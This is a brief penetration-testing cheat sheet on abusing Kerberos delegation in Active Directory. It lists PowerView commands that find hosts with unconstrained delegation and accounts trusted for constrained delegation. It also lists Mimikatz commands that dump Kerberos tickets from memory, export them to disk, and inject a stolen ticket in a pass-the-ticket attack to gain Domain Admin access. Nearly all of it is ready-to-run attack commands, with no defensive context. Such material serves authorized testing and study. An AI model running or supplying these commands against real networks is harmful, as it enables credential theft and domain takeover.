### Unconstrained Delegation

Get computers with Unconstrained delegation #PowerView
```powershell
Get-NetComputer -Unconstrained
```
Check if DA token is available #Mimikatz 
```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```
Save tickets to disk #Mimikatz 
```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets"' /export
```
Pass the ticket to memory using Mimikatz #Mimikatz 
```
Invoke-Mimikatz -Command '"kerberos::ptt <exported ticket name>"'
```

### Constrained Delegation

Get users / computers with constrained delegation enabled #PowerView
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

